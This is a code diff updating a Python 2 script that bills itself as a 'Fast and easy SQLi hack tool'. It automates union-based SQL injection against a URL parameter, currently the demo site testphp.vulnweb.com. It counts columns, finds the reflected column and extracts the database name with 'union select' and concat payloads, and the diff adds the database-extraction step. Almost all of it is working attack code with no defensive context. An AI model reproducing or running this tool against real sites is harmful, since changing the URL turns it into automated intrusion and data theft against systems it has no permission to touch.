@@ -1,6 +1,8 @@
 import subprocess as sp
 import urllib as cybers
-sp.call('cls',shell=True)
+import sys
+import os
+os.system('cls')
 header="""
 ____ _              ___      _                     _____                      
 /__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
@@ -10,15 +12,20 @@ ____ _              ___      _                     _____
                          |___/                                                 
 
 More: https://www.facebook.com/TheCybersTeam
-Fast and easy SQLi hack tool Beta 0.4
+Fast and easy SQLi hack tool Beta 0.6
 """
 print header
 
 url = "http://testphp.vulnweb.com/listproducts.php?cat="
+print "Url: "+url
+print "\n"
 
 def getContent(url):
     res = cybers.urlopen(url)
     return res.read()
+
+def status(i):
+    sys.stdout.write("\rColumns: {0}".format(i))
 
 def countColumns(url):
     key = "Th3Cyb3rsT34m"
@@ -28,42 +35,64 @@ def countColumns(url):
     finish = 50
 
     for i in range(start,finish):
+        status(i)
         if i != start and i != finish:
             url = url + ", "
 
         url = url + "'"+key+"'"
         res = getContent(url)
-        
+
         if res.find(key) !=-1:
             return i
             break
     return 0
 
 columns = countColumns(url)
-print "Columns: " + str(columns)
 
 def getVulColumns(columns, url):
-    columns = columns + 1
     key = "Th3Cyb3rsT34m"
     inject = "666Th3Cyb3rsTeam666"
-    for i in range(1, columns):
-        linha = "-1 union select "
-        for j in range(1, columns):
-            if j != 1 and j != columns:
-                linha = linha + ", "
+    for i in range(1, columns+1):
+        line = "-1 union select "
+        for j in range(1, columns+1):
+            if j != 1 and j != columns+1:
+                line = line + ", "
 
             if i == j:
-                linha+="'"+inject+"'"
+                line+="'"+inject+"'"
             else:
-                linha+="'"+key+"'"
+                line+="'"+key+"'"
 
-        res = getContent(url + linha)
+        res = getContent(url + line)
         if res.find(inject) !=-1:
             return i
             break
     return 0
 
 vulCol = getVulColumns(columns,url)
-print "Vul Column: " +str(vulCol)
+print "\nVul Column: " +str(vulCol)
+
+def getVars(content):
+    pos = content.find("'#")
+    if(pos != -1):      
+        ini = content[pos+2:]
+        pos = ini.find("#'")
+        return ini[:pos]
+
+def getDatabase(vulCol,columns,url):
+    url = url + "-1 union select "
+    for i in range(1, columns+1):
+        if i != 1 and i != columns+1:
+            url = url + ", "
+        if i == vulCol:
+            url = url + "concat(0x27,0x23,database(),0x23,0x27)"
+        else:
+            url = url + str(i)
+
+    res = getContent(url)
+    return getVars(res)
+
+database = getDatabase(vulCol,columns,url)
+print "Database: "+database
 
 
